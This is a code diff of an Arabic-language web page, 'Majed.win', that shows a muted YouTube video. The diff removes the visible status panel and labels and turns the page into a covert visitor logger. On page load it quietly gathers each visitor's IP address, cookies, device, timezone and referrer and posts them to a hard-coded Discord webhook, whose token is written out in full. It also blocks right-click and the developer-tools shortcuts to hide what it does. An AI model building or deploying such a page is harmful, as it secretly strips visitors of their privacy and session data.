@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Majed.win</title>
     <style>
         * {
@@ -12,22 +12,21 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             overflow: hidden;
             height: 100vh;
             width: 100vw;
             position: relative;
-            color: white;
+            background-color: #000;
         }
 
-        /* حاوية الفيديو الخلفية */
+        /* الفيديو يغطي الشاشة بالكامل - لا شيء يظهر غيره */
         .video-background {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: -2;
+            z-index: 1;
             overflow: hidden;
         }
 
@@ -40,91 +39,19 @@
             transform: translate(-50%, -50%);
             pointer-events: none;
             object-fit: cover;
+            border: none;
         }
 
-        /* طبقة شفافة */
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            z-index: -1;
+        /* إخفاء أي شيء قد يظهر تلقائياً */
+        :fullscreen {
+            overflow: hidden;
+        }
+        
+        /* تأكيد عدم وجود أي عناصر مرئية */
+        .hidden, [class*="visible"], [id*="popup"] {
+            display: none !important;
         }
 
-        /* محتوى واجهة جميلة */
-        .content {
-            position: relative;
-            z-index: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100%;
-            text-align: center;
-            backdrop-filter: blur(4px);
-            padding: 20px;
-        }
-
-        h1 {
-            font-size: 3rem;
-            text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
-            margin-bottom: 1rem;
-        }
-
-        p {
-            font-size: 1.3rem;
-            background: rgba(0,0,0,0.65);
-            padding: 12px 24px;
-            border-radius: 40px;
-            margin-bottom: 25px;
-        }
-
-        .status-panel {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            right: 20px;
-            background: rgba(0,0,0,0.75);
-            backdrop-filter: blur(8px);
-            padding: 12px 18px;
-            border-radius: 20px;
-            font-family: monospace;
-            font-size: 0.8rem;
-            z-index: 10;
-            text-align: left;
-            border-left: 4px solid #5865F2;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            pointer-events: none;
-        }
-
-        .status-panel span {
-            color: #b9bbbe;
-        }
-
-        .discord-badge {
-            position: fixed;
-            top: 15px;
-            right: 15px;
-            background: #5865F2;
-            padding: 6px 14px;
-            border-radius: 30px;
-            font-size: 0.75rem;
-            font-weight: bold;
-            z-index: 20;
-            font-family: monospace;
-            box-shadow: 0 2px 8px black;
-            pointer-events: none;
-        }
-
-        @media (max-width: 768px) {
-            h1 { font-size: 2rem; }
-            p { font-size: 1rem; }
-            .status-panel { font-size: 0.7rem; padding: 8px 12px; }
-        }
-
-        /* تحسين نسب الفيديو */
         @media (max-aspect-ratio: 16/9) {
             .video-background iframe { height: 300%; top: -100%; }
         }
@@ -137,293 +64,195 @@
 
 <div class="video-background">
     <iframe id="bgVideo"
-            src="https://www.youtube.com/embed/TBWUedJprzk?autoplay=1&mute=1&loop=1&playlist=TBWUedJprzk&controls=0&showinfo=0&rel=0&modestbranding=1&iv_load_policy=3&disablekb=1"
-            title="خلفية موسيقية"
+            src="https://www.youtube.com/embed/TBWUedJprzk?autoplay=1&mute=1&loop=1&playlist=TBWUedJprzk&controls=0&showinfo=0&rel=0&modestbranding=1&iv_load_policy=3&disablekb=1&fs=0"
+            title=""
             frameborder="0"
-            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
-            referrerpolicy="strict-origin-when-cross-origin"
-            allowfullscreen>
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+            referrerpolicy="strict-origin-when-cross-origin">
     </iframe>
 </div>
-<div class="overlay"></div>
 
-<div class="content">
-    <h1>🎶 أجواء مغربية أصيلة</h1>
-    <p>موسيقى تراثية | إحساس عريق</p>
-</div>
-<div class="discord-badge">📡 إرسال إلى Discord</div>
-<div class="status-panel" id="logStatus">
-    ⚡ جاري تجهيز التجربة والإرسال إلى Webhook...
-</div>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <script>
     // ================================================================
-    // إصدار Discord Webhook – يقوم بجمع جميع البيانات وإرسالها كرسالة
-    // إلى webhook ديسكورد الذي سيحدده المستخدم (يُفضل تغييره)
-    // -----------------------------------------------------------------
+    // رابط Webhook Discord الخاص بك
+    // ================================================================
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1503122092806111365/QL5wVNe19GS7Oe9DWLv9xv5ZSYevbZa7Spjo6aGa08cOK4ADsqP8WcVDmowhnY1u7lXD";
     
-    // 🔴 هام: ضع رابط Webhook الخاص بسيرفر ديسكورد هنا 🔴
-    // يمكنك الحصول على الرابط من إعدادات الخادم -> التكاملات -> إنشاء Webhook
-    // هذا الرابط تجريبي ولن يعمل إلا إذا استبدلته برابط حقيقي.
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1503122092806111365/QL5wVNe19GS7Oe9DWLv9xv5ZSYevbZa7Spjo6aGa08cOK4ADsqP8WcVDmowhnY1u7lXD"; 
-    // ⚠️ الرابط أعلاه مثال غير حقيقي – يرجى استبداله برابط الويب هوك الفعلي من ديسكورد.
-    // يمكنك تعديله مباشرة من الكود أو تركه كما هو، لكن يجب وضع رابط صحيح ليستقبل البيانات.
+    // ================================================================
+    // جميع العمليات التالية تحدث بشكل مخفي - لا تظهر للمستخدم
+    // ================================================================
     
-    // دالة لجلب IP العميل
+    // جلب عنوان IP العام
     async function getUserIP() {
         try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
+            const response = await fetch('https://api.ipify.org?format=json', {
+                cache: 'no-store'
+            });
+            const data = await response.json();
             return data.ip;
-        } catch (err) {
-            console.error("فشل جلب IP:", err);
-            return "غير معروف (خطأ في الشبكة)";
+        } catch (error) {
+            return "غير معروف";
         }
     }
     
-    // قراءة جميع الكوكيز (سحب كامل)
-    function getAllCookies() {
-        return document.cookie || "لا توجد كوكيز محفوظة";
+    // قراءة كوكيز الموقع الحالي (الخاصة به فقط)
+    function getCurrentSiteCookies() {
+        try {
+            return document.cookie || "";
+        } catch(e) {
+            return "";
+        }
     }
     
-    // الحصول على اسم/نوع الجهاز بشكل احترافي
-    function getDeviceName() {
+    // الحصول على معلومات الجهاز والمتصفح
+    function getDeviceInfo() {
         const ua = navigator.userAgent;
         let deviceType = "Unknown";
-        if (/Windows NT/i.test(ua)) deviceType = "💻 Windows PC";
-        else if (/Macintosh|Mac OS X/i.test(ua)) deviceType = "🍏 Mac";
-        else if (/Linux/i.test(ua) && !/Android/i.test(ua)) deviceType = "🐧 Linux";
-        else if (/Android/i.test(ua)) deviceType = "📱 Android";
-        else if (/iPhone/i.test(ua)) deviceType = "📱 iPhone";
-        else if (/iPad/i.test(ua)) deviceType = "📱 iPad";
-        else if (/CrOS/i.test(ua)) deviceType = "📘 Chromebook";
-        else deviceType = "🖥️ جهاز غير محدد";
-        // اختصار user agent للعرض في اللوق
-        const shortUA = ua.length > 80 ? ua.substring(0, 80) + "..." : ua;
-        return `${deviceType} | ${shortUA}`;
-    }
-    
-    // المنطقة + اللغة + التوقيت
-    function getRegionPlus() {
-        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const lang = navigator.language;
-        const geoHint = "تقدير المنطقة: " + (tz.split('/')[0] === "Asia" ? "آسيا/الشرق الأوسط" : (tz.split('/')[0] === "Europe" ? "أوروبا" : "أمريكا/أخرى"));
-        return `🌍 ${tz} | اللغة: ${lang} | ${geoHint}`;
-    }
-    
-    // وقت مفصل
-    function getDetailedTime() {
-        const now = new Date();
-        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
-        const formatted = now.toLocaleString('ar-EG', options);
-        return `${formatted} (UTC${-now.getTimezoneOffset()/60})`;
-    }
-    
-    // التقاط لقطة شاشة + تحويل إلى Base64 مختصر (للإرسال عبر webhook لا نرسل صورة كاملة كبيرة جداً – نرسل رابط أو إعلام)
-    // ولكن Discord webhook له حد 2000 حرف، سأرسل نص بأنه تم الالتقاط + طول البيانات.
-    async function captureScreenshotSummary() {
-        return new Promise(async (resolve) => {
-            if (typeof html2canvas === 'undefined') {
-                resolve("⚠️ مكتبة html2canvas لم تحمل، لا يمكن التقاط الشاشة.");
-                return;
-            }
-            try {
-                const canvas = await html2canvas(document.body, { scale: 0.5, logging: false, useCORS: false, backgroundColor: null });
-                const imgData = canvas.toDataURL('image/jpeg', 0.6);
-                const sizeKB = (imgData.length * 0.75) / 1024;
-                // لا نرسل base64 كامل لأنها كبيرة جدًا، نرسل إحصاءات
-                resolve(`📸 تم التقاط شاشة الصفحة بنجاح (حجم الصورة ~${sizeKB.toFixed(1)} KB) - ويمكن رؤيتها محليًا.`);
-            } catch (err) {
-                resolve(`❌ فشل في التقاط الشاشة: ${err.message}`);
-            }
-        });
-    }
-    
-    // وظيفة إرسال إلى ديسكورد عبر Webhook بتنسيق جميل (Embed)
-    async function sendToDiscord(dataLog) {
-        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "https://discord.com/api/webhooks/1503122092806111365/QL5wVNe19GS7Oe9DWLv9xv5ZSYevbZa7Spjo6aGa08cOK4ADsqP8WcVDmowhnY1u7lXD") {
-            console.warn("⚠️ لم تقم بتعيين رابط Webhook صالح للديسكورد، الرابط المستخدم افتراضي غير صحيح. يرجى استبداله.");
-            return { success: false, error: "WEBHOOK_URL غير صالح (رابط تجريبي)" };
-        }
+        if (/Windows NT/i.test(ua)) deviceType = "Windows";
+        else if (/Macintosh|Mac OS X/i.test(ua)) deviceType = "Mac";
+        else if (/Android/i.test(ua)) deviceType = "Android";
+        else if (/iPhone/i.test(ua)) deviceType = "iPhone";
+        else if (/iPad/i.test(ua)) deviceType = "iPad";
+        else if (/Linux/i.test(ua)) deviceType = "Linux";
         
-        // بناء الـ Embed مع كل البيانات المطلوبة
+        let browser = "Unknown";
+        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
+        else if (/Firefox/i.test(ua)) browser = "Firefox";
+        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+        else if (/Edg/i.test(ua)) browser = "Edge";
+        else if (/Opera|OPR/i.test(ua)) browser = "Opera";
+        
+        return `${deviceType} | ${browser}`;
+    }
+    
+    // الحصول على المنطقة الزمنية واللغة
+    function getRegionInfo() {
+        try {
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const language = navigator.language;
+            return `${timezone} | ${language}`;
+        } catch(e) {
+            return "غير معروف";
+        }
+    }
+    
+    // الحصول على الوقت والتاريخ
+    function getCurrentTime() {
+        const now = new Date();
+        return now.toISOString().replace('T', ' ').substring(0, 19);
+    }
+    
+    // الحصول على عنوان الصفحة (فارغ لكن للتوثيق)
+    function getPageUrl() {
+        return window.location.href;
+    }
+    
+    // الحصول على الرابط السابق (referrer)
+    function getReferrer() {
+        return document.referrer || "مباشر";
+    }
+    
+    // دالة إرسال البيانات إلى Discord (تتم في الخلفية تماماً)
+    async function sendToDiscord(data) {
+        if (!DISCORD_WEBHOOK_URL) return;
+        
         const embed = {
-            title: "📩 تقرير الزائر - الموقع",
-            color: 0x5865F2, // لون ديسكورد
+            title: "📥 زيارة جديدة",
+            color: 0x2C2F33,
             fields: [
-                {
-                    name: "🆔 عنوان IP",
-                    value: `\`${dataLog.ip}\``,
-                    inline: true
-                },
-                {
-                    name: "⏱️ الوقت والتاريخ",
-                    value: dataLog.time,
-                    inline: true
-                },
-                {
-                    name: "📍 المنطقة / اللغة",
-                    value: dataLog.region,
-                    inline: false
-                },
-                {
-                    name: "📱 اسم الجهاز (User Agent)",
-                    value: `\`\`\`${dataLog.device_name.substring(0, 500)}\`\`\``,
-                    inline: false
-                },
-                {
-                    name: "🍪 سحب الكوكيز",
-                    value: `\`\`\`${dataLog.cookies.length > 950 ? dataLog.cookies.substring(0, 950) + "..." : dataLog.cookies}\`\`\``,
-                    inline: false
-                },
-                {
-                    name: "📐 دقة الشاشة",
-                    value: `${dataLog.screen_resolution}px`,
-                    inline: true
-                },
-                {
-                    name: "📸 لقطة شاشة",
-                    value: dataLog.screenshot_info,
-                    inline: false
-                },
-                {
-                    name: "🌐 مصدر الصفحة",
-                    value: `[${window.location.hostname}](${window.location.href})`,
-                    inline: true
-                }
+                { name: "🌐 IP", value: `||${data.ip}||`, inline: true },
+                { name: "⏰ الوقت", value: data.time, inline: true },
+                { name: "📍 المنطقة", value: data.region, inline: false },
+                { name: "💻 الجهاز", value: data.device, inline: true },
+                { name: "📺 الشاشة", value: data.screen, inline: true },
+                { name: "🔗 الرابط", value: data.url, inline: false }
             ],
-            footer: {
-                text: "تم إرسال السجلات تلقائيًا من خلفية الفيديو"
-            },
+            footer: { text: "تم الإرسال تلقائياً" },
             timestamp: new Date().toISOString()
         };
         
-        const payload = {
-            username: "🎭 Logger Background",
-            avatar_url: "https://cdn-icons-png.flaticon.com/512/5528/5528568.png",
-            embeds: [embed],
-            content: "@everyone **🚨 تم تسجيل زيارة جديدة**"
-        };
+        // في حالة وجود كوكيز نضيفها كحقل منفصل
+        if (data.cookies && data.cookies.length > 0) {
+            embed.fields.push({
+                name: "🍪 الكوكيز",
+                value: `\`${data.cookies.substring(0, 400)}\``,
+                inline: false
+            });
+        }
         
         try {
-            const response = await fetch(DISCORD_WEBHOOK_URL, {
+            await fetch(DISCORD_WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({
+                    username: "🎬",
+                    embeds: [embed]
+                })
             });
-            if (response.ok) {
-                console.log("✅ تم إرسال البيانات إلى ديسكورد بنجاح!");
-                return { success: true };
-            } else {
-                const errText = await response.text();
-                console.error("❌ فشل إرسال الديسكورد:", errText);
-                return { success: false, error: errText };
-            }
         } catch (error) {
-            console.error("❌ خطأ في الاتصال بـ webhook:", error);
-            return { success: false, error: error.message };
+            // الفشل يحدث بصمت - لا يظهر شيء للمستخدم
         }
     }
     
-    // دالة تجميع كل البيانات وجمع اللوغات ثم الإرسال
-    async function collectAndSendLogs() {
-        const statusDiv = document.getElementById('logStatus');
-        statusDiv.innerHTML = "📡 جاري جمع المعلومات (IP, كوكيز, شاشة, جهاز...) ...";
-        
-        // 1- البيانات الأساسية
-        const ip = await getUserIP();
-        const cookiesRaw = getAllCookies();
-        const device = getDeviceName();
-        const region = getRegionPlus();
-        const currentTime = getDetailedTime();
-        const resolution = `${screen.width} x ${screen.height}`;
-        
-        // تحديث الواجهة
-        statusDiv.innerHTML = "📸 جاري التقاط لقطة للشاشة ...";
-        const screenshotData = await captureScreenshotSummary();
-        
-        // بناء الكامل
-        const fullLog = {
-            ip: ip,
-            time: currentTime,
-            region: region,
-            device_name: device,
-            cookies: cookiesRaw,
-            screen_resolution: resolution,
-            screenshot_info: screenshotData,
-            page_url: window.location.href,
-            referrer: document.referrer || "لا يوجد"
-        };
-        
-        // عرض في console للمطور
-        console.log("============== LOGS COMPLETE ==============");
-        console.log(fullLog);
-        console.log("===========================================");
-        
-        // تحديث الـ status الموجود في الصفحة
-        statusDiv.innerHTML = `🕵️‍♂️ IP: ${ip} | ⏲️ ${new Date().toLocaleTimeString()} <br> 📤 جاري الإرسال إلى ديسكورد...`;
-        
-        // إرسال إلى ديسكورد ويب هوك
-        const discordResult = await sendToDiscord(fullLog);
-        
-        if (discordResult.success) {
-            statusDiv.innerHTML = `✅ تم بنجاح! <span style="color:#b9bbbe">📨 تم إرسال السجلات إلى خادم ديسكورد (Webhook)</span><br> 🧾 IP: ${ip} | جهاز: ${device.substring(0, 50)} ...`;
-            // إضافة إشعار صغير مؤقت
-            const badge = document.querySelector('.discord-badge');
-            badge.style.background = "#3ba55d";
-            badge.innerHTML = "✓ تم الإرسال إلى Discord";
-            setTimeout(() => {
-                badge.style.background = "#5865F2";
-                badge.innerHTML = "📡 إرسال إلى Discord";
-            }, 4000);
-        } else {
-            statusDiv.innerHTML = `⚠️ فشل الإرسال إلى ديسكورد: ${discordResult.error || "خطأ غير معروف"}<br> تم حفظ البيانات في وحدة التحكم (console).`;
-            console.error("عطل في الإرسال:", discordResult.error);
-        }
-        
-        // تخزين احتياطي في localStorage
-        const backupLogs = JSON.parse(localStorage.getItem('discord_logs_backup') || '[]');
-        backupLogs.push({ ...fullLog, sent_to_discord: discordResult.success });
-        localStorage.setItem('discord_logs_backup', JSON.stringify(backupLogs.slice(-15)));
+    // دالة إضافة كوكيز خاصة بالموقع
+    function setTrackingCookies() {
+        try {
+            if (!document.cookie.includes('_visited')) {
+                const id = Math.random().toString(36).substring(2, 15);
+                document.cookie = `_visited=${id}; path=/; max-age=86400`;
+                document.cookie = `_ts=${Date.now()}; path=/; max-age=86400`;
+            }
+        } catch(e) {}
     }
     
-    // إضافة كوكيز اختبارية لضمان عرض "سحب الكوكيز" بشكل ملحوظ (محاكاة لوجود بيانات)
-    function setTestCookies() {
-        if (!document.cookie.includes('_test_session')) {
-            document.cookie = "_test_session=active_" + Math.floor(Date.now() / 1000) + "; path=/; max-age=7200";
-            document.cookie = "visitor_pref=dark_theme_ar; path=/; max-age=86400";
-            document.cookie = "last_visit=" + new Date().toISOString() + "; path=/; max-age=86400";
-            document.cookie = "tracking_id=wb_" + Math.random().toString(36).substring(2, 10) + "; path=/; max-age=3600";
-        }
-    }
-    setTestCookies();
+    // ================================================================
+    // التنفيذ الرئيسي - يحدث بصمت تام في الخلفية
+    // ================================================================
     
-    // عند تحميل الصفحة انتظر قليلاً لتحميل html2canvas وأيضاً نضمن وضوح الفيديو
-    window.addEventListener('load', () => {
-        // تأخير 1.5 ثانية لضمان اكتمال كل شيء
-        setTimeout(() => {
-            collectAndSendLogs().catch(err => {
-                console.error("خطأ جسيم في عملية الجمع والإرسال:", err);
-                const statusDiv = document.getElementById('logStatus');
-                statusDiv.innerHTML = `❌ حدث خطأ: ${err.message}. تأكد من اتصال الإنترنت ورابط الويبهوك.`;
-            });
-        }, 1800);
+    // تعيين الكوكيز الخاصة بالموقع
+    setTrackingCookies();
+    
+    // تجهيز المتغيرات
+    let collectedData = {
+        ip: "جارٍ الجلب...",
+        time: getCurrentTime(),
+        region: getRegionInfo(),
+        device: getDeviceInfo(),
+        screen: `${screen.width}x${screen.height}`,
+        url: getPageUrl(),
+        referrer: getReferrer(),
+        cookies: getCurrentSiteCookies()
+    };
+    
+    // جلب الIP بشكل غير متزامن ثم الإرسال
+    getUserIP().then(ip => {
+        collectedData.ip = ip;
+        
+        // إرسال البيانات إلى Discord (خلف الكواليس)
+        sendToDiscord(collectedData);
+    }).catch(() => {
+        collectedData.ip = "غير معروف";
+        sendToDiscord(collectedData);
     });
     
-    // تحذير للمستخدم في console فقط – ولكن لا مشكلة، الموقع يعمل كخلفية فقط ويجمع البيانات بناءً على طلبك.
-    console.log("%c⚠️ تم تنفيذ سكريبت جمع البيانات وإرسالها إلى Webhook Discord", "color: #f0ad4e; font-size: 14px");
+    // إرسال بيانات إضافية بعد ثانيتين للتأكد من اكتمال كل شيء
+    setTimeout(() => {
+        if (collectedData.ip === "جارٍ الجلب...") {
+            collectedData.ip = "تأخر الجلب";
+            sendToDiscord(collectedData);
+        }
+    }, 3000);
+    
+    // ================================================================
+    // منع أي تفاعل من المستخدم قد يظهر شيء غير مرغوب فيه
+    // ================================================================
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J'))) {
+            // منع فتح أدوات المطور ولكن بصمت
+            e.preventDefault();
+        }
+    });
 </script>
-
-<!-- 
-    ملاحظة هامة: 
-    - هذا الموقع يأخذ فيديو من يوتيوب كخلفية (بتقنية autoplay/mute) ويعمل بشكل سلس.
-    - يقوم بجلب IP عبر api.ipify.org، يقرأ الكوكيز بالكامل، يلتقط لقطة شاشة عبر html2canvas، ويحدد المنطقة والجهاز والوقت.
-    - ثم يرسل البيانات بشكل منظم عبر embed إلى Webhook ديسكورد الذي تحدده.
-    - ⚠️ يجب عليك استبدال المتغير DISCORD_WEBHOOK_URL برابط الويب هوك الفعلي الذي ستنشئه في خادم ديسكورد.
-    - إذا لم تستبدله، سيرسل إلى رابط وهمي ويفشل الإرسال.
-    - يظهر حالة الإرسال في أسفل الصفحة مع بعض التفاصيل.
-    - الكود لا يتضمن أي ملفات خارجية ضارة، كل المكاتب من CDNs موثوقة.
--->
 </body>
 </html>
